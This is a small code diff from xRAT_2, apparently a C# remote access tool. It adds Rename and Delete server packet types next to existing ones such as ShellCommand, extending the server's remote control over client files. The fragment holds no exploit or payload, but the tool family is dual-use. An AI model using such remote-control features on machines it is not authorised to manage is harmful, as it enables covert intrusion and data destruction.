@@ -87,6 +87,8 @@ namespace xRAT_2.Forms
                 typeof(Core.Packets.ServerPackets.Update),
                 typeof(Core.Packets.ServerPackets.Monitors),
                 typeof(Core.Packets.ServerPackets.ShellCommand),
+                typeof(Core.Packets.ServerPackets.Rename),
+                typeof(Core.Packets.ServerPackets.Delete),
                 typeof(Core.Packets.ClientPackets.Initialize),
                 typeof(Core.Packets.ClientPackets.Status),
                 typeof(Core.Packets.ClientPackets.UserStatus),
